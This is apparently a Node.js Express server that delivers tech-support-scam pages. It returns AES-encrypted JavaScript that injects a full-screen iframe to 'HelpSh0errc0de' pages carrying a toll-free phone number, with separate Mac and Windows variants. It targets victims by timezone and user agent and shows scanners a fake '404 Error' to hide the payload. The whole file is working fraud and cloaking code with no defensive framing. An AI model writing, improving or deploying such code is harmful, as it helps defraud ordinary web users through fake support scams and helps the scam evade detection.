const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

app.use(cors());
app.use(express.json());

// --------------------
// FAST DEVICE DETECTION
// --------------------
function getDeviceType(ua) {
    if (!ua) return "other";
    return (ua.includes("Macintosh") || ua.includes("Mac OS")) ? "mac" : "other";
}

// --------------------
// Allowed timezones (Set = fastest lookup)
// --------------------
const allowedTimezones = new Set([
    "Asia/Tokyo", "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin",
    "America/New_York",
    "America/Chicago",
    "America/Denver",
    "America/Los_Angeles",
    "America/Anchorage",
    "Pacific/Honolulu",
    "America/Toronto",
    "America/Vancouver",
    "America/Edmonton",
    "America/Winnipeg",
    "America/Halifax",
    "America/St_Johns"
]);

// --------------------
// ENCRYPTION (RUNS ONLY ONCE)
// --------------------
function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

// --------------------
// PRE-COMPILED PAYLOADS (KEY OPTIMIZATION)
// --------------------
const LINKS = {
    mac: "https://hhholoooo.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369",
    other: "https://hhholoooo.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369"
};

// Build iframe scripts ONCE
function buildIframe(url) {
    return encodeURIComponent(aesEncode(
        'const iframe=document.createElement("iframe");' +
        'iframe.src="' + url + '";' +

        'iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");' +
        'iframe.setAttribute("allowfullscreen","");' +
        'iframe.setAttribute("webkitallowfullscreen","");' +
        'iframe.setAttribute("mozallowfullscreen","");' +

        'iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");' +

        'iframe.style.width="100%";' +
        'iframe.style.height="100%";' +
        'iframe.style.border="0";' +

        'document.getElementById("contentiframe").replaceChildren(iframe);'
    ));
}

// PRE-COMPILED RESPONSES (NO CRYPTO DURING REQUESTS)
const PRECOMPILED_RESPONSE = {
    mac: buildIframe(LINKS.mac),
    other: buildIframe(LINKS.other),
    error: encodeURIComponent(aesEncode(`console.log("Error Find");`))
};

// --------------------
// ROUTES (EXTREMELY FAST NOW)
// --------------------
app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "404 Error",
        response: PRECOMPILED_RESPONSE.error
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;

    const ua = req.get("User-Agent") || "";
    const deviceType = getDeviceType(ua);

    if (allowedTimezones.has(timezone)) {
        res.send(PRECOMPILED_RESPONSE[deviceType] || PRECOMPILED_RESPONSE.other);
    } else {
        res.send(PRECOMPILED_RESPONSE.error);
    }
});

// --------------------
// START SERVER
// --------------------
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
